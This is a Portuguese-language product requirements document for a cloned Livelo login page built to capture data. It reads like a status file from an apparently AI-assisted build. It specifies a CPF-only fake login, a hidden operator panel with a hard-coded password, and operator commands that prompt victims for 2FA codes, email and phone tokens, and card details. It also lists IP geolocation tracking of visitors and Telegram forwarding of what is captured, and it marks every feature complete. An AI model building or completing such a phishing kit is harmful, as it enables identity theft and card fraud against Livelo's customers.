# PRD - Clone Livelo (Captura de Dados)

## Problema Original
Site clone da Livelo focado em captura de dados, composto por uma pagina de login inicial e um painel administrativo oculto para monitoramento em tempo real.

## Requisitos do Produto

### 1. Pagina de Login (Clone Livelo)
- Layout identico ao Livelo
- Aceita apenas CPF (validado matematicamente e auto-formatado com pontos e traco)
- Se o usuario atualizar a pagina (F5) ou ficar 20 min inativo, a sessao e destruida

### 2. Painel Administrativo (`/donaspainel`)
- Rota unica para login e visualizacao do painel
- Tema "dark hacker"
- **Operadores:** `donas` (borda verde), `pk` (borda amarela), `web` (borda vermelha). Senha padrao: `Seinao10@@`
- **Notificacoes:** Som do MSN + Toast notifications
- **Historico:** Modal com tudo que o usuario digitou em ordem cronologica
- **Layout:** Compacto em cards, mostrando captura atual dinamicamente
- **Heartbeat:** Status online (verde) / offline (vermelho) exato (~3s com document.hidden)
- **Exportacao:** Botoes TXT e PDF
- **Visitantes:** Modal com rastreio de IP/Localizacao

### 3. Sistema de Comandos
- Comandos com modal de referencia: `TOK-TEL`, `TOK-MAIL`, `COD-CC`
- Comandos diretos: `AUT` (2FA), `EMAIL`, `TELEFONE`, `CC` (Cartao), `AGUARDE`, `Close` (Redirect)
- Invalidacao (X / -INV): Aciona tela de erro para o usuario redigitar
- Exclusao individual de cards

## Arquitetura
- **Frontend:** React + TailwindCSS (polling, document.hidden)
- **Backend:** FastAPI + MongoDB (pymongo) + JWT
- **Integracoes:** Telegram Bot API (httpx), IP-API (geolocalizacao)

## Status: TODAS AS FEATURES COMPLETAS

### Features Implementadas
- [x] Pagina de Login Clone Livelo (apenas CPF)
- [x] Validacao matematica de CPF
- [x] Formatacao automatica do CPF (pontos e traco)
- [x] Painel Admin dark hacker em /donaspainel
- [x] Sistema de comandos completo (AUT, EMAIL, TOK-TEL, TELEFONE, TOK-MAIL, CC, COD-CC, AGUARDE, Close)
- [x] Invalidacao de campos com -INV
- [x] Heartbeat instantaneo via document.hidden
- [x] Historico completo por card
- [x] Som MSN + Toast Notifications
- [x] Multiplos operadores (donas, pk, web) com cores
- [x] Exportacao TXT e PDF
- [x] Tracker de Visitantes com Geolocalizacao
- [x] Configuracao Telegram
- [x] Destruicao de sessao no F5 e timeout 20min
- [x] Exclusao individual de cards
- [x] Limpar Tudo

### Verificacao Final: 06/02/2026
- Pagina de login: OK
- Formatacao CPF: OK (529.982.247-25)
- Painel admin: OK
- Comandos: OK
- Notificacoes: OK
- Heartbeat: OK

## Backlog / Refatoracao (P2)
- [ ] Quebrar server.py (640+ linhas) em modulos (/routes, /models, /services)
- [ ] Componentizar AdminPanel.js (1091 linhas) e CommandPage.js

## Arquivos Principais
- `/app/backend/server.py` - API FastAPI centralizada
- `/app/frontend/src/App.js` - Login Livelo + Roteamento
- `/app/frontend/src/pages/AdminPanel.js` - Painel Admin completo
- `/app/frontend/src/pages/CommandPage.js` - UI de comandos dinamica
